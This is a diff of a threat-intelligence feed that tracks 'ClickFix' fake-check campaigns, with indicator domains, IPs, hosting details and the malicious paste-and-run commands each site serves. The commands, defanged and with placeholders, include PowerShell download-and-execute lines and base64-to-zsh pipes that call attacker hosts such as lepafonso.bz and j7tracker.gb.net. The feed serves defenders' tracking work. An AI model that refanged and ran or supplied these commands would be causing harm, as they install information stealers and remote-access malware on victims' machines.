@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5830,
+ "count": 5828,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -37978,9 +37978,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null"
    ],
    "connects_to": [
     "xorados.com",
@@ -37988,8 +37988,9 @@
     "hagosuro.lc",
     "trek-72.com",
     "groverudder12.com",
-    "trustchecknes.com",
     "j7tracker.gb.net",
+    "trustchecknes.com",
+    "lmabagas.com",
     "lepafonso.bz"
    ],
    "lure_from": [
@@ -75784,58 +75785,6 @@
    ]
   },
   {
-   "indicator": "corebridgewellness.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-12",
-   "last_seen": "2026-11-16",
-   "last_online": "2026-11-25",
-   "offline_since": null,
-   "url": "https://corebridgewellness.com/personal-training/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "GoDaddy",
-   "ip": "160.153.0.47",
-   "asn": "AS209242",
-   "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "160.153.0.47",
-     "asn": "AS209242",
-     "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
-     "first_seen": "2026-11-12",
-     "last_seen": "2026-11-16"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "corebridgewellness.com",
-     "status": "online",
-     "first_seen": "2026-11-12",
-     "last_seen": "2026-11-16"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
-   ],
-   "connects_to": [
-    "lepafonso.bz",
-    "github.pw"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "corfuescapes2nature.com",
    "type": "domain",
    "category": "clickfix",
@@ -79526,9 +79475,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -83027,56 +82978,6 @@
     "github.pw",
     "t-trustresnew.com",
     "trustchecknes.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
-   "indicator": "databreedafrica.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-12",
-   "last_seen": "2026-11-14",
-   "last_online": "2026-11-25",
-   "offline_since": null,
-   "url": "https://www.databreedafrica.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Truehost Cloud Limited",
-   "dns": "cloudoon.com",
-   "ip": "102.212.246.115",
-   "asn": "AS329278",
-   "org": "Truehost Cloud Limited - Truehost Cloud Limited, KE",
-   "country": "KE",
-   "ips": [
-    {
-     "ip": "102.212.246.115",
-     "asn": "AS329278",
-     "org": "Truehost Cloud Limited - Truehost Cloud Limited, KE",
-     "first_seen": "2026-11-12",
-     "last_seen": "2026-11-14"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.databreedafrica.com",
-     "status": "online",
-     "first_seen": "2026-11-12",
-     "last_seen": "2026-11-14"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
-   ],
-   "connects_to": [
-    "github.pw"
    ],
    "lure_from": [
     "interseq.at"
@@ -127463,13 +127364,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "echo '[encoded]' | base64 -d | zsh",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "echo '[encoded]' | base64 -d | zsh",
     "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
-    "entitlementcheck.pro",
     "j7tracker.gb.net",
+    "entitlementcheck.pro",
     "github.pw"
    ],
    "lure_from": [
@@ -133721,13 +133622,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "echo '[encoded]' | base64 -d | zsh",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "echo '[encoded]' | base64 -d | zsh",
     "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
-    "entitlementcheck.pro",
     "j7tracker.gb.net",
+    "entitlementcheck.pro",
     "github.pw"
    ],
    "lure_from": [
@@ -152028,13 +151929,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "echo '[encoded]' | base64 -d | zsh",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "echo '[encoded]' | base64 -d | zsh",
     "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
-    "entitlementcheck.pro",
     "j7tracker.gb.net",
+    "entitlementcheck.pro",
     "github.pw"
    ],
    "lure_from": [
@@ -153012,9 +152913,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "echo '[encoded]' | base64 -d | zsh",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
+    "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
     "j7tracker.gb.net",
@@ -265558,6 +265459,7 @@
     "id-verfied.boats",
     "verifing-server.codes",
     "ncheck-brows.beer",
+    "browse-login.info",
     "codes.browse-cdn.beer"
    ],
    "lure_from": [
